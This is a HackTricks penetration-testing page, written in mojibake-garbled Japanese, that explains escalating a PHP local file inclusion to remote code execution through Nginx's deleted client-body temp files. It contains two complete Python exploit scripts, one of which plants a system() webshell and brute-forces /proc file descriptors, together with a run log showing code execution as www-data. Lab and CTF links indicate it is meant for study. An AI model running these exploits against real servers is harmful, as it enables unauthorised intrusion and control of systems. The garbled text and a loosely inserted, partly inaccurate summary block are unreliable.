# LFI2RCE via Nginx temp files

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã«**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
## è„†å¼±ãªè¨­å®š

* PHPã‚³ãƒ¼ãƒ‰ï¼š
```
<?php include_once($_GET['file']);
```
* FPM / PHP è¨­å®š:
```
...
php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
...
```
* ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ— / å¼·åŒ–:
```
...
chown -R 0:0 /tmp /var/tmp /var/lib/php/sessions
chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
...
```
å¹¸ã„ãªã“ã¨ã«ã€PHPã¯ç¾åœ¨ã€PHP-FPMã¨Nginxã‚’ä»‹ã—ã¦ã‚ˆãå±•é–‹ã•ã‚Œã¦ã„ã¾ã™ã€‚Nginxã«ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒœãƒ‡ã‚£ï¼ˆpostã«é™ã‚‰ãšï¼‰ãŒç‰¹å®šã®é–¾å€¤ã‚ˆã‚Šå¤§ãã„å ´åˆã«ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã€è¦‹è½ã¨ã•ã‚ŒãŒã¡ãª[client body buffering](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size)æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®æ©Ÿèƒ½ã«ã‚ˆã‚Šã€NginxãŒPHPã¨åŒã˜ãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆéå¸¸ã«ä¸€èˆ¬çš„ã«www-dataã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ï¼‰ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹ä»–ã®æ–¹æ³•ãŒãªãã¦ã‚‚ã€LFIsã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

é–¢é€£ã™ã‚‹Nginxã®ã‚³ãƒ¼ãƒ‰ï¼š
```c
ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
ngx_fd_t  fd;

fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
access ? access : 0600);

if (fd != -1 && !persistent) {
(void) unlink((const char *) name);
}

return fd;
}
```
**tempfileãŒNginxã«ã‚ˆã£ã¦é–‹ã‹ã‚ŒãŸç›´å¾Œã«ã™ãã«ã‚¢ãƒ³ãƒªãƒ³ã‚¯ã•ã‚Œã‚‹**ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚å¹¸é‹ãªã“ã¨ã«ã€**procfsã‚’ä½¿ç”¨ã—ã¦å‰Šé™¤ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®å‚ç…§ã‚’ãƒ¬ãƒ¼ã‚¹ã‚’é€šã˜ã¦ã¾ã å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ï¼š
```
...
/proc/34/fd:
total 0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -> anon_inode:[eventfd]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -> socket:[27587]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -> socket:[27589]
lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -> socket:[44926]
lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -> socket:[44927]
lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -> /var/lib/nginx/body/0000001368 (deleted)
...
```
```
æ³¨: ã“ã®ä¾‹ã§ã¯ã€PHPã® `include` é–¢æ•°ãŒãƒ‘ã‚¹ã‚’ `/var/lib/nginx/body/0000001368 (deleted)` ã«è§£æ±ºã™ã‚‹ãŸã‚ã€ç›´æ¥ `/proc/34/fd/15` ã‚’å«ã‚ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã“ã‚Œã¯ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«å­˜åœ¨ã—ãªã„ãŸã‚ã§ã™ã€‚å¹¸ã„ã«ã‚‚ã€æ¬¡ã®ã‚ˆã†ãªé–“æ¥çš„ãªæ–¹æ³•ã§ã“ã®å°ã•ãªåˆ¶é™ã‚’å›é¿ã§ãã¾ã™: `/proc/self/fd/34/../../../34/fd/15`ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å‰Šé™¤ã•ã‚ŒãŸ `/var/lib/nginx/body/0000001368` ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ãŒæœ€çµ‚çš„ã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

## å®Œå…¨ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ
```
```python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes
r  = requests.get(URL, params={
'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
r  = requests.get(URL, params={
'file': f'/proc/{pid}/cmdline'
})

if b'nginx: worker process' in r.content:
print(f'[*] nginx worker found: {pid}')

nginx_workers.append(pid)
if len(nginx_workers) >= cpus:
break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
print('[+] starting uploader')
while not done:
requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
t = threading.Thread(target=uploader)
t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
global done

while not done:
print(f'[+] brute loop restarted: {pid}')
for fd in range(4, 32):
f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
r  = requests.get(URL, params={
'file': f,
'c': f'id'
})
if r.text:
print(f'[!] {f}: {r.text}')
done = True
exit()

for pid in nginx_workers:
a = threading.Thread(target=bruter, args=(pid, ))
a.start()
```
```markdown
# LFI to RCE via Nginx Temporary Files

## æ¦‚è¦

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã¯ã€Nginxã®ä»•çµ„ã¿ã‚’åˆ©ç”¨ã—ã¦Local File Inclusionï¼ˆLFIï¼‰ã‹ã‚‰Remote Code Executionï¼ˆRCEï¼‰ã¸ã¨æ˜‡æ ¼ã•ã›ã‚‹æ–¹æ³•ã‚’èª¬æ˜ã—ã¾ã™ã€‚

## Nginxã®ä»•çµ„ã¿

Nginxã¯ã€å¤§é‡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’åŠ¹ç‡çš„ã«å‡¦ç†ã™ã‚‹ãŸã‚ã«ã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€`/var/lib/nginx/tmp`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã‚‹ã“ã¨ãŒå¤šã„ã§ã™ã€‚

## æ”»æ’ƒã‚·ãƒŠãƒªã‚ª

1. æ”»æ’ƒè€…ã¯ã€è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’é€šã˜ã¦LFIã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
2. æ”»æ’ƒè€…ã¯ã€NginxãŒç”Ÿæˆã—ãŸä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¾ã™ã€‚
3. æ”»æ’ƒè€…ã¯ã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«PHPã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¾ã™ã€‚
4. æ”»æ’ƒè€…ã¯ã€LFIã‚’åˆ©ç”¨ã—ã¦æ³¨å…¥ã—ãŸPHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

## å®Ÿè¡Œæ–¹æ³•

ä»¥ä¸‹ã®ã‚¹ãƒ†ãƒƒãƒ—ã«å¾“ã£ã¦ãã ã•ã„ã€‚

### ã‚¹ãƒ†ãƒƒãƒ—1: LFIã®æ¤œå‡º

LFIã®å­˜åœ¨ã‚’ç¢ºèªã—ã¾ã™ã€‚

### ã‚¹ãƒ†ãƒƒãƒ—2: Nginxã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€ã‚’ç‰¹å®š

`/var/lib/nginx/tmp`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’æ¢ç´¢ã—ã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€ã‚’ç‰¹å®šã—ã¾ã™ã€‚

### ã‚¹ãƒ†ãƒƒãƒ—3: PHPã‚³ãƒ¼ãƒ‰ã®æ³¨å…¥

ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«PHPã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¾ã™ã€‚

### ã‚¹ãƒ†ãƒƒãƒ—4: RCEã®å®Ÿè¡Œ

LFIã‚’åˆ©ç”¨ã—ã¦æ³¨å…¥ã—ãŸPHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã€RCEã‚’é”æˆã—ã¾ã™ã€‚

## çµè«–

Nginxã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€LFIã‹ã‚‰RCEã¸ã¨æ˜‡æ ¼ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€é©åˆ‡ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ã®è¨­å®šã¨ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒãƒã®é©ç”¨ãŒé‡è¦ã§ã™ã€‚
```
```
$ ./pwn.py 127.0.0.1 1337
[*] cpus: 2; pid_max: 32768
[*] nginx worker found: 33
[*] nginx worker found: 34
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] brute loop restarted: 33
[+] brute loop restarted: 34
[!] /proc/self/fd/34/../../../34/fd/9: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### åˆ¥ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

ã“ã‚Œã¯ [https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/](https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/) ã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚
```python
import requests
import threading
import multiprocessing
import threading
import random

SERVER = "http://localhost:8088"
NGINX_PIDS_CACHE = set([34, 35, 36, 37, 38, 39, 40, 41])
# Set the following to True to use the above set of PIDs instead of scanning:
USE_NGINX_PIDS_CACHE = False

def create_requests_session():
session = requests.Session()
# Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=10000)
session.mount('http://', adapter)
return session

def get_nginx_pids(requests_session):
if USE_NGINX_PIDS_CACHE:
return NGINX_PIDS_CACHE
nginx_pids = set()
# Scan up to PID 200
for i in range(1, 200):
cmdline = requests_session.get(SERVER + f"/?action=read&file=/proc/{i}/cmdline").text
if cmdline.startswith("nginx: worker process"):
nginx_pids.add(i)
return nginx_pids

def send_payload(requests_session, body_size=1024000):
try:
# The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast
payload = '<?php system("/readflag"); ?> //'
requests_session.post(SERVER + "/?action=read&file=/bla", data=(payload + ("a" * (body_size - len(payload)))))
except:
pass

def send_payload_worker(requests_session):
while True:
send_payload(requests_session)

def send_payload_multiprocess(requests_session):
# Use all CPUs to send the payload as request body for Nginx
for _ in range(multiprocessing.cpu_count()):
p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,))
p.start()

def generate_random_path_prefix(nginx_pids):
# This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/<nginx pid 1>/cwd/proc/<nginx pid 2>/root/proc/<nginx pid 3>/root
path = ""
component_num = random.randint(0, 10)
for _ in range(component_num):
pid = random.choice(nginx_pids)
if random.randint(0, 1) == 0:
path += f"/proc/{pid}/cwd"
else:
path += f"/proc/{pid}/root"
return path

def read_file(requests_session, nginx_pid, fd, nginx_pids):
nginx_pid_list = list(nginx_pids)
while True:
path = generate_random_path_prefix(nginx_pid_list)
path += f"/proc/{nginx_pid}/fd/{fd}"
try:
d = requests_session.get(SERVER + f"/?action=include&file={path}").text
except:
continue
# Flags are formatted as hxp{<flag>}
if "hxp" in d:
print("Found flag! ")
print(d)

def read_file_worker(requests_session, nginx_pid, nginx_pids):
# Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range
for fd in range(10, 45):
thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids))
thread.start()

def read_file_multiprocess(requests_session, nginx_pids):
for nginx_pid in nginx_pids:
p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids))
p.start()

if __name__ == "__main__":
print('[DEBUG] Creating requests session')
requests_session = create_requests_session()
print('[DEBUG] Getting Nginx pids')
nginx_pids = get_nginx_pids(requests_session)
print(f'[DEBUG] Nginx pids: {nginx_pids}')
print('[DEBUG] Starting payload sending')
send_payload_multiprocess(requests_session)
print('[DEBUG] Starting fd readers')
read_file_multiprocess(requests_session, nginx_pids)
```
## Labs

* [https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz)
* [https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/)
* [https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/](https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/)

## å‚è€ƒæ–‡çŒ®

* [https://bierbaumer.net/security/php-lfi-with-nginx-assistance/](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã«**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
